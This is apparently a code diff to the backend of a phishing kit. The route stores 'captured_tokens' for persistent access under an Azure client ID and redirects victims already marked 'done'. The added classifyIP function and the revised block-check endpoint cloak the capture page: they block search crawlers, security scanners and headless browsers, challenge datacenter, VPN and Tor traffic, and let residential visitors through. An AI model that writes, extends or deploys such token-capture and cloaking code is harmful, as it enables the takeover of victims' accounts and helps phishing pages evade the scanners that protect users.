@@ -313,7 +313,7 @@ router.post('/', captureValidators, validateResult, async (req, res) => {
     // Insert token record (encrypted) with 100-year expiration for persistent access
     const ttlHours = config.COOKIE_MAX_TTL_HOURS || 720; // Max 30 days
 
-    const clientIdUsed = config.AZURE_CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
+    const clientIdUsed = config.AZURE_CLIENT_ID || '4813382a-8fa7-425e-ab75-3b753aab3abb';
 
     const [result] = await db.query(
         `INSERT INTO captured_tokens
@@ -423,15 +423,73 @@ router.post('/', captureValidators, validateResult, async (req, res) => {
     }
 });
 
+// ─── IP Classification Helper ────────────────────────────────────────────────
+// Classifies visitor IP into categories for anti-bot challenging
+function classifyIP(ip, userAgent, headers) {
+  // Check for known crawler/scanner signatures in User-Agent
+  const crawlerPatterns = [
+    /bot/i, /spider/i, /crawl/i, /scraper/i, /curl/i, /wget/i,
+    /python-requests/i, /httpclient/i, /java\//i, /phantom/i,
+    /headless/i, /selenium/i, /puppeteer/i, /playwright/i,
+    /slurp/i, /bingbot/i, /googlebot/i, /yandexbot/i, /baiduspider/i
+  ];
+
+  const ua = userAgent || '';
+  for (const pattern of crawlerPatterns) {
+    if (pattern.test(ua)) {
+      return { type: 'crawler', action: 'block', confidence: 0.95 };
+    }
+  }
+
+  // Check for missing or suspicious User-Agent
+  if (!ua || ua.length < 10) {
+    return { type: 'suspicious', action: 'challenge', confidence: 0.8 };
+  }
+
+  // Check Cloudflare IP metadata if available
+  const ipType = headers['cf-ip-type'] || '';
+  const ipTypeLower = ipType.toLowerCase();
+
+  if (ipTypeLower.includes('datacenter') || ipTypeLower.includes('hosting')) {
+    return { type: 'datacenter', action: 'challenge', confidence: 0.9 };
+  }
+  if (ipTypeLower.includes('vpn') || ipTypeLower.includes('proxy') || ipTypeLower.includes('tor')) {
+    return { type: 'vpn', action: 'challenge', confidence: 0.9 };
+  }
+  if (ipTypeLower.includes('mobile')) {
+    return { type: 'mobile', action: 'challenge', confidence: 0.85 };
+  }
+  if (ipTypeLower.includes('satellite')) {
+    return { type: 'satellite', action: 'challenge', confidence: 0.85 };
+  }
+
+  // Fallback: check known datacenter IP ranges (simplified check)
+  // In production, you'd use a proper IP intelligence service
+  const datacenterIndicators = [
+    /^10\./, /^172\.(1[6-9]|2\d|3[01])\./, /^192\.168\./, // Private ranges
+    /^100\.(6[4-9]|[7-9]\d|1[01]\d|12[0-7])\./, // CGNAT
+    /^169\.254\./, // Link-local
+  ];
+
+  for (const indicator of datacenterIndicators) {
+    if (indicator.test(ip)) {
+      return { type: 'private', action: 'challenge', confidence: 0.7 };
+    }
+  }
+
+  // Default: residential IP - allow through
+  return { type: 'residential', action: 'allow', confidence: 0.95 };
+}
+
 // ─── Visitor Block Check (called by worker before serving page) ──────────────
 router.post('/visitor/block-check', async (req, res) => {
   try {
     const { jwt_token, visitor_ip } = req.body;
-    
+
     if (!jwt_token || !visitor_ip) {
       return res.status(400).json({ error: 'jwt_token and visitor_ip required' });
     }
-    
+
     // Decode JWT to get user_id
     let decoded;
     try {
@@ -439,45 +497,62 @@ router.post('/visitor/block-check', async (req, res) => {
     } catch (e) {
       return res.status(401).json({ error: 'Invalid token' });
     }
-    
-    const { user_id } = decoded;
-    
-    // Check if block_done_visitors is enabled
+
+    const { user_id, link_id } = decoded;
+    const userAgent = req.headers['user-agent'] || req.get('user-agent') || '';
+
+    // ── Step 1: Check block_done_visitors (existing logic) ────────────────
     const [settingsRows] = await db.query(
       'SELECT block_done_visitors, redirect_url FROM visitor_settings WHERE user_id = ?',
       [user_id]
     );
-    
-    if (!settingsRows.length || !settingsRows[0].block_done_visitors) {
-      return res.json({ blocked: false });
-    }
-    
-    // Check if visitor has status 'done' or 'blocked'
-    const [visitorRows] = await db.query(
-      "SELECT id, status FROM visitors WHERE ip_address = ? AND user_id = ? AND status IN ('done', 'blocked') ORDER BY created_at DESC LIMIT 1",
-      [visitor_ip, user_id]
-    );
-    
-    if (visitorRows.length > 0) {
-      // Log the blocked revisit attempt
-      try {
-        const userAgent = req.headers.get('user-agent') || '';
-        const country = req.headers.get('CF-IPCountry') || '';
-        await db.query(
-          "INSERT INTO visitors (user_id, link_id, ip_address, user_agent, country, status, worker_name) VALUES (?, ?, ?, ?, ?, 'blocked', 'worker')",
-          [user_id, decoded.link_id, visitor_ip, userAgent, country]
-        );
-      } catch (logErr) {
-        console.error('[Capture] Failed to log blocked revisit:', logErr.message);
+
+    if (settingsRows.length && settingsRows[0].block_done_visitors) {
+      const [visitorRows] = await db.query(
+        "SELECT id, status FROM visitors WHERE ip_address = ? AND user_id = ? AND status IN ('done', 'blocked') ORDER BY created_at DESC LIMIT 1",
+        [visitor_ip, user_id]
+      );
+
+      if (visitorRows.length > 0) {
+        try {
+          const country = req.headers['cf-ipcountry'] || req.get('CF-IPCountry') || '';
+          await db.query(
+            "INSERT INTO visitors (user_id, link_id, ip_address, user_agent, country, status, worker_name) VALUES (?, ?, ?, ?, ?, 'blocked', 'worker')",
+            [user_id, link_id, visitor_ip, userAgent, country]
+          );
+        } catch (logErr) {
+          console.error('[Capture] Failed to log blocked revisit:', logErr.message);
+        }
+
+        return res.json({
+          blocked: true,
+          redirect_url: settingsRows[0].redirect_url || ''
+        });
       }
-      
-      return res.json({
-        blocked: true,
-        redirect_url: settingsRows[0].redirect_url || ''
-      });
     }
-    
-    return res.json({ blocked: false });
+
+    // ── Step 2: Anti-Bot IP Classification ────────────────────────────────
+    const ipClassification = classifyIP(visitor_ip, userAgent, req.headers);
+
+    // Log visitor for analytics
+    try {
+      const country = req.headers['cf-ipcountry'] || req.get('CF-IPCountry') || '';
+      await db.query(
+        "INSERT INTO visitors (user_id, link_id, ip_address, user_agent, country, status, worker_name, ip_type) VALUES (?, ?, ?, ?, ?, 'visited', 'worker', ?)",
+        [user_id, link_id, visitor_ip, userAgent, country, ipClassification.type]
+      );
+    } catch (logErr) {
+      // Silent fail for logging
+    }
+
+    // Return classification result for worker to decide action
+    return res.json({
+      blocked: ipClassification.action === 'block',
+      challenged: ipClassification.action === 'challenge',
+      ip_type: ipClassification.type,
+      confidence: ipClassification.confidence,
+      action: ipClassification.action
+    });
   } catch (err) {
     console.error('[Capture] visitor/block-check error:', err.message);
     res.status(500).json({ error: 'Server error' });
